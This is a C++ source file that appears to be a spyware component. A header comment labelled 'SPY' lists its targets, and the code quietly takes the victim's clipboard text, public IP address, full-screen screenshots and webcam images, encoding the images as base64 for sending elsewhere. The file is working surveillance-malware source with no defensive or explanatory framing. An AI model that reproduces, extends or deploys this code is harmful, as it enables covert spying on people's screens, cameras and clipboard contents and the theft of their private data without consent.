/*
SPY:
grab cookies: return whatever
grab publicip: return string [ok]
grab history: return whatever (check jabor)
record audio
screenshot: return base64 [ok]
webcam image: return base64, unless above, or whatever CV returns [ok]
clipboard: return string [ok]
*/

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#include <mutex>

#include <opencv2/opencv.hpp>

#include "request.hpp"

#pragma once

std::string GrabClipboard() {
    if (!OpenClipboard(NULL)) {
        return "failed to open clipboard";
    }
    HANDLE hClipboard = GetClipboardData(CF_TEXT);
    char* pData = static_cast<char*>(GlobalLock(hClipboard));
    GlobalUnlock(hClipboard);
    CloseClipboard();
    return pData;
}

std::string GrabIP() {
    return GET_Request("http://ifconfig.me/ip");
}

CLSID GetEncoderClsid(const WCHAR* format) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::ImageCodecInfo* codecs = nullptr;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return CLSID_NULL;
    codecs = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (codecs == nullptr) return CLSID_NULL;
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(codecs[i].MimeType, format) == 0) {
            CLSID clsid;
            clsid = codecs[i].Clsid;
            free(codecs);
            return clsid;
        }
    }
    free(codecs);
    return CLSID_NULL;
}

std::string GrabScreenshot() {

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // Create a screen capture
    SetProcessDPIAware();
    int nWidth = GetSystemMetrics(SM_CXSCREEN);
    int nHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(GetDesktopWindow());
    int nLogicalScreenWidth = GetDeviceCaps(hdcScreen, HORZRES);
    int nLogicalScreenHeight = GetDeviceCaps(hdcScreen, VERTRES);
    int nDpiX = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int nDpiY = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    int nScaleX = nDpiX / 96;
    int nScaleY = nDpiY / 96;
    int nCaptureWidth = nWidth * nScaleX;
    int nCaptureHeight = nHeight * nScaleY;
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, nCaptureWidth, nCaptureHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, nCaptureWidth, nCaptureHeight, hdcScreen, 0, 0, SRCCOPY);

    // Save the screenshot to a memory stream
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsidEncoder = GetEncoderClsid(L"image/png");
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 100;
    encoderParams.Parameter[0].Value = &quality;

    IStream* pStream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    bitmap.Save(pStream, &clsidEncoder, &encoderParams);

    // Get the size of the encoded data
    LARGE_INTEGER zeroOffset = { 0 };
    ULARGE_INTEGER streamSize;
    pStream->Seek(zeroOffset, STREAM_SEEK_END, &streamSize);
    pStream->Seek(zeroOffset, STREAM_SEEK_SET, nullptr);

    // Read the encoded data from the stream
    std::vector<BYTE> buffer(streamSize.LowPart);
    ULONG bytesRead = 0;
    pStream->Read(buffer.data(), buffer.size(), &bytesRead);

    // Convert the binary data to base64 string
    std::string base64;
    const std::string base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t inputSz = buffer.size();
    size_t outputSz = 4 * ((inputSz + 2) / 3);

    base64.resize(outputSz);
    unsigned char* input = buffer.data();
    unsigned char* output = reinterpret_cast<unsigned char*>(&base64[0]);

    for (size_t i = 0, j = 0; i < inputSz;) {
        uint32_t octetA = i < inputSz ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octetB = i < inputSz ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octetC = i < inputSz ? static_cast<uint32_t>(input[i++]) : 0;

        uint32_t triple = (octetA << 16) + (octetB << 8) + octetC;

        output[j++] = base64Chars[(triple >> 18) & 0x3F];
        output[j++] = base64Chars[(triple >> 12) & 0x3F];
        output[j++] = base64Chars[(triple >> 6) & 0x3F];
        output[j++] = base64Chars[triple & 0x3F];
    }

    // Add padding characters if needed
    size_t padding = 3 - (inputSz % 3);
    if (padding != 3) base64.resize(outputSz - padding);

    // Clean up resources
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    DeleteObject(hBitmap);
    pStream->Release();

    return base64;
}

std::mutex mxWebcam;
bool GetWebcamImage(std::string* pBase64) {
    std::lock_guard<std::mutex> lgLock(mxWebcam);
    cv::VideoCapture cap(0);
    if (!cap.isOpened()) return false;
    cv::Mat frame;
    for (int i = 0; i != 10; i++) {
        if (!cap.read(frame)) {
            cap.release();
            return false;
        }
    }
    std::vector<unsigned char> buffer;
    cv::imencode(".jpg", frame, buffer);
    std::string base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0;
    int j = 0;
    unsigned char arr3[3];
    unsigned char arr4[4];
    for (unsigned char c: buffer) {
        arr3[i++] = c;
        if (i == 3) {
            arr4[0] = (arr3[0] & 0xfc) >> 2;
            arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
            arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
            arr4[3] = arr3[2] & 0x3f;
            for (i = 0; (i < 4); i++) *pBase64 += base64Chars[arr4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) arr3[j] = '\0';
        arr4[0] = (arr3[0] & 0xfc) >> 2;
        arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
        arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
        for (j = 0; (j < i + 1); j++) *pBase64 += base64Chars[arr4[j]];
        while ((i++ < 3)) *pBase64 += '=';
    }
    cap.release();
    return true;
}